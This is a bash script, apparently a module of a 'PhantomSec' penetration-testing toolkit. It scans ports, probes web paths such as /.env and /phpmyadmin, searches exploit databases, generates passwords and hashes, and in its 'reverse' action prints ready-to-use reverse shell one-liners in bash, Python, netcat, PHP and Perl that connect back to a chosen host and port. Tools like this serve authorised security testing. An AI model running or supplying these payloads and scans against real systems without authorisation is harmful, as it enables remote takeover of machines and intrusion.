#!/usr/bin/env bash
# PhantomSec — Security Tools Module (called by phantomsec.sh)
# Provides: port scanner, vulnerability scanner, password generator,
#           reverse shell generator, hash cracker helper, exploit search

G='\033[0;32m' C='\033[0;36m' NC='\033[0m' R='\033[0;31m' Y='\033[1;33m' BOLD='\033[1m'

TARGET="${1:-}"
[ -z "$TARGET" ] && { echo "Usage: $0 <target> [action]"; exit 1; }
ACTION="${2:-scan}"

case "$ACTION" in
  scan)
    echo -e "\n${G}[+] Port Scan:${NC} $TARGET"
    if command -v nmap &>/dev/null; then
      nmap -T4 --top-ports 1000 "$TARGET" 2>/dev/null
    elif command -v nc &>/dev/null; then
      echo "  Scanning common ports..."
      for port in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1723 3389 5900 8080; do
        (echo >/dev/tcp/"$TARGET"/"$port") 2>/dev/null && echo "  $port/open"
      done
    else
      echo -e "${R}  No scanner available (install nmap)${NC}"
    fi
    ;;

  vuln)
    echo -e "\n${G}[+] Vulnerability Check:${NC} $TARGET"
    if command -v nmap &>/dev/null; then
      nmap --script vuln "$TARGET" 2>/dev/null | head -50
    elif command -v nikto &>/dev/null; then
      nikto -h "$TARGET" -maxtime 60 2>/dev/null | head -30
    else
      echo "  Checking common vulnerable endpoints..."
      for path in /admin /phpmyadmin /wp-login.php /.env /robots.txt /server-info; do
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://$TARGET$path" 2>/dev/null)
        [ "$code" != "000" ] && [ "$code" != "404" ] && echo "  $path → HTTP $code"
      done
    fi
    ;;

  password|passgen)
    LENGTH="${3:-16}"
    COUNT="${4:-5}"
    echo -e "\n${G}[+] Password Generator${NC} (length=$LENGTH, count=$COUNT)"
    echo "  Entropy: $(echo "l($LENGTH * 62)/l(2)" | bc -l 2>/dev/null | cut -d. -f1) bits"
    for i in $(seq 1 "$COUNT"); do
      cat /dev/urandom | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$LENGTH"
      echo ""
    done
    ;;

  reverse|revshell)
    LHOST="${3:-$(hostname -I 2>/dev/null | awk '{print $1}')}"
    LPORT="${4:-4444}"
    echo -e "\n${G}[+] Reverse Shell Payloads${NC}"
    echo -e "\n  ${BOLD}Bash:${NC}"
    echo "  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    echo -e "\n  ${BOLD}Python:${NC}"
    echo "  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo -e "\n  ${BOLD}Netcat:${NC}"
    echo "  nc -e /bin/sh $LHOST $LPORT"
    echo -e "\n  ${BOLD}PHP:${NC}"
    echo "  php -r 'exec(\"/bin/bash -c \\\"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\\"\");'"
    echo -e "\n  ${BOLD}Perl:${NC}"
    echo "  perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($LPORT,inet_aton(\"$LHOST\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'"
    echo ""
    ;;

  hash)
    echo -e "\n${G}[+] Hash Generator:${NC} $TARGET"
    echo "  MD5:    $(echo -n "$TARGET" | md5sum | cut -d' ' -f1)"
    echo "  SHA1:   $(echo -n "$TARGET" | sha1sum | cut -d' ' -f1)"
    echo "  SHA256: $(echo -n "$TARGET" | sha256sum | cut -d' ' -f1)"
    echo "  SHA512: $(echo -n "$TARGET" | sha512sum | cut -d' ' -f1)"
    ;;

  exploit)
    echo -e "\n${G}[+] Exploit Search:${NC} $TARGET"
    if command -v searchsploit &>/dev/null; then
      searchsploit "$TARGET" 2>/dev/null | head -20
    else
      echo "  Online: https://www.exploit-db.com/search?q=$TARGET"
      echo "  CVE:    https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=$TARGET"
    fi
    ;;

  *)
    echo "Actions: scan, vuln, password, reverse, hash, exploit"
    ;;
esac
